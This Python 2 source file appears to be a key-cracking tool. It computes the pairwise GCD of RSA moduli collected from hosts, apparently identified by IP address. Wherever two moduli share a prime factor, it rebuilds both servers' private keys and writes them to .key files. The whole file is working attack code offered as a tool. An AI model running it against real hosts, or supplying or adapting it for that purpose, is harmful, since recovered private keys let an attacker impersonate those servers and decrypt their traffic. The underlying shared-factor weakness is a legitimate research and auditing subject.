from abc import ABCMeta, abstractmethod
from RSATools import *
from ModulusList import *

class Cracker:

	__metaclass__ = ABCMeta

	def __init__(self, ModulusList, StatusInformer = None):
		self._ModulusList = ModulusList
		if StatusInformer != None:
			self._informer = StatusInformer
		else:
			self._informer = StatusInformerScreenPrinter()

	@abstractmethod
	def CrackAndWriteCertificates(self):
		pass

class CrackerImpl(Cracker):

	def CrackAndWriteCertificates(self):
		for i in range(0, self._ModulusList.length() - 1):
			record1 = self._ModulusList[i]
			for j in range(i, self._ModulusList.length() - 1):
				record2 = self._ModulusList[j+1]
				ngcd = gcd(record1[1], record2[1])
				if ngcd != 1 and ngcd != record1[1] and ngcd != record2[1]:
					self._informer.InformUserOfSuccessfulCrack(record1[0], record2[0])
					forgeKeys(record1, record2, ngcd)

class StatusInformer:

	@abstractmethod
	def InformUserOfSuccessfulCrack(self, ip1, ip2):
		pass

class StatusInformerScreenPrinter(StatusInformer):

	def InformUserOfSuccessfulCrack(self, ip1, ip2):
		print "[+] Found keys for " + ip1 + " and " + ip2 + "."

def forgeKeys(record1, record2, gcd):
	'''
	Create fake private key certificates using common factor of record modulus values.
	'''
	rsa1 = RSA(p = gcd, q = record1[1]/gcd, e = record1[2])
	key1 = rsa1.to_pem()
	f = open(record1[0] + ".key", 'wb')
	f.write(key1)
	f.close()
	rsa2 = RSA(p = gcd, q = record2[1]/gcd, e = record2[2])
	key2 = rsa2.to_pem()
	f = open(record2[0] + ".key", 'wb')
	f.write(key2)
	f.close()

def gcd(a, b):
	while b:
		a, b = b, a%b
	return a
